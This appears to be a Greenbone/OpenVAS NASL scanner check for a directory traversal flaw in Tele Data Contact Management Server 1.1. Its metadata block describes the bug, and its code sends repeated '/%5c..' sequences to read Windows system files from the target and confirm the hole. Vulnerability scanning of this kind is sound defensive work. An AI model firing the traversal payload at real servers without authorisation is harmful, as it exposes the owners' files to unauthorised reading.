if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801899" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 48114 );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Tele Data Contact Management Server Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "TD_Contact_Management_Server/banner" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/44854" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/102015/TeleDataContactManagementServer-traversal.txt" );
	script_xref( name: "URL", value: "http://www.autosectools.com/Advisory/Tele-Data-Contact-Management-Server-Directory-Traversal-231" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "affected", value: "Tele Data Contact Management Server version 1.1." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of URI containing '%5c..'
  sequences, which allows attackers to read arbitrary files via directory traversal attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Tele Data Contact Management Server and is
  prone to directory traversal vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: TD Contact Management Server" )){
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	file = files[pattern];
	url = NASLString( crap( data: "/%5c..", length: 6 * 10 ), "/", file );
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

